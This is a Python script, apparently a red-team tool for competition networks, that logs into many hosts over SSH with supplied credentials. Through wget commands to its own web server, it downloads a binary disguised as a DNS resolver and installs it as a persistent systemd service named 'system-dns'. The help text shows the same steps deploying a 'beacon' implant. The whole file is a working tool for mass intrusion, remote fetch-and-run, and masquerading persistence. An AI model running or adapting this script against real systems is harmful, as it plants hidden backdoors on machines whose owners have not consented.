import argparse
import paramiko
import os
import re
import sys
import signal
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.server import SimpleHTTPRequestHandler
from multiprocessing import Process
from socketserver import TCPServer

# The commands that will be run over SSH on the target machines in order of execution
COMMANDS = [
    "wget http://10.0.4.25/resolution -O /usr/bin/ldns-resolver",
    "wget http://10.0.4.25/system-dns.service -O /usr/lib/systemd/system/system-dns.service",
    "chmod +x /usr/bin/ldns-resolver",
    "systemctl enable system-dns",
    "systemctl start system-dns"
]
# The IP address of the machine running this script in the network
SERVER = "10.0.4.25"
# The code will call os.chdir() before serving, no need for adding subdir in URL
WEBDIR = os.path.join(os.path.dirname(__file__), 'files')

parser = argparse.ArgumentParser(
formatter_class=argparse.RawTextHelpFormatter,
description="""
Linux Deployment via SSH and HTTP. Given a directory, this script will stand up a temproary
webserver to host files and can use that webserver to pull down files via SSH. You must
edit the file to manually edit the COMMANDS, SERVER, WEBDIR variables.

Example:
        Deploy a Linux Service remotely to teams 1,4,7 on hosts 3,5,22, given elevated
        credetnials root:Sup3rS3cure! on the network topology of 10.[TeamNumber].20.[Host]

        $ python3 linux-deploy.py --teams=1,4,7 --hosts=3,5,22 root Sup3rS3cure! 10.X.20.Y

        $ cat linux-deploy.py
        ... SNIP ...
        COMMANDS = [
            "wget http://10.0.4.25/cool_beacon -O /usr/bin/beacon_binary",
            "wget http://10.0.4.25/unit_file -O /usr/lib/systemd/system/beacon.service",
            "chmod +x /usr/bin/beacon_binary",
            "systemctl enable beacon",
            "systemctl start beacon"
        ]
        SERVER = "10.0.4.25"
        WEBDIR = os.path.join(os.path.dirname(__file__), 'files')
        ... SNIP ....

""")
parser.add_argument("username", type=str)
parser.add_argument("password", type=str)
parser.add_argument("targets", type=str, nargs='+', help="Addresses to deploy to. (e.g 10.X.2.Y or 10.4.5.10)")
parser.add_argument("--teams", type=str, nargs=1, default="1", help="The number of teams. Will replace X with (e.g 1,2,4,9)")
parser.add_argument("--hosts", type=str, nargs=1, default="1", help="The specific host numbers. Will replace Y. (e.g 1,2,4,8,20)")
parser.add_argument("--threads", type=int, nargs=1, default=5, help="The number of workers to use to deploy. Default 5")
parser.add_argument("--check", action="store_true", help="View the targets before deployment. No SSH or HTTP activity.")

def process_args():
    global addresses
    global args

    args = parser.parse_args()
    # Split the hosts and teams to proper lists
    if args.hosts:
        args.hosts = args.hosts[0].split(',')
    if args.teams:
        # if '-' in input, then it is a sequential range
        if '-' in args.teams[0]:
            start, end = args.teams[0].split('-')
            args.teams = [x for x in range(int(start), int(end)+1)]
        else:
            args.teams = args.teams[0].split(',')

    # Generate targets from option specifications
    addresses = []
    team_number = re.compile(r"[xX]")
    host_number = re.compile(r"[yY]")
    for addr in args.targets:
        for team in args.teams:
            for host in args.hosts:
                # Substitute X placeholder for the team numbers
                out = team_number.sub(str(team), addr)
                # Substitute Y placeholder for specific hosts
                out = host_number.sub(host, out)
                if out not in addresses:
                    addresses.append(out)

def deploy(host, username, password):
    status_code = 0
    err = ""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=host, username=username, password=password)
        for command in COMMANDS:
            # Get the binary we're executing for logging purposes
            binary = command.split(" ")[0]
            _, stdout, stderr = client.exec_command(command)
            # all returns must be 0. Adding all together must == 0
            status_code += int(stdout.channel.recv_exit_status())
            # accumulate all error messages to display each to user
            # in order of appearance to let user know which commands failed
            err += f"\t[{binary}] {stderr.readline().strip()}\n"
            if status_code:
                break
        client.close()
        return status_code, err

    except Exception as e:
        return 1, f"\t{str(e)}"

def run():
    global failures
    failures = []
    
    # We don't need the webserver if we're not using
    pid = os.fork() if WEBDIR else 1

    # Child process will handle standing up webserver
    if pid == 0:
        try:
            # Stand up the webserver to host the binary and service file
            print(f"[STATUS] Serving {WEBDIR} @ http://{SERVER}:80...")
            httpd = TCPServer((SERVER, 80), SilentWebserver)
            os.chdir(WEBDIR)
            server_process = Process(target=httpd.serve_forever)
            server_process.run()
            server_process.join()
        except KeyboardInterrupt:
            print("[STATUS] Closing Webserver...")
        except Exception as e:
            print(f"[STATUS] Error standing up webserver: {str(e)}")
    else:
        # Make sure the webserver starts before commands are sent
        time.sleep(1)
        print("[STATUS] Starting deployment...")
        with ThreadPoolExecutor(args.threads) as pool:
            # For each host we need to deploy to, submit a request
            # to the pool to run the command. This will yield a Future object
            # while invoking the method and map the ip address to that object
            # later use for status information
            tasks = {pool.submit(deploy, host, args.username, args.password): host for host in addresses}
            # As tasks are completed by the pool, they will appear
            # in the output of as_completed(tasks)
            for future in as_completed(tasks):
                ip = tasks[future]
                status, out = future.result()
                if status:
                    failure(f"[{ip}] FAILURE.\n{out}")
                    failures.append(ip)
                else:
                    success(f"[{ip}] SUCCESS.")

        print("[STATUS] Deployment Complete.")
        print(f"Failed Deployments: {' '.join(failures)}")
        # Stop the webserver if we are using it
        if WEBDIR:
            os.kill(pid, signal.SIGKILL)

def failure(output): print(f"\033[91m {output}\033[00m") 

def success(output): print(f"\033[92m {output}\033[00m") 

class SilentWebserver(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        return 

if __name__ == "__main__":
    process_args()
    if args.check:
        print("Targets: ")
        for t in addresses:
            print(f"\t{t}")
    else:
        run()
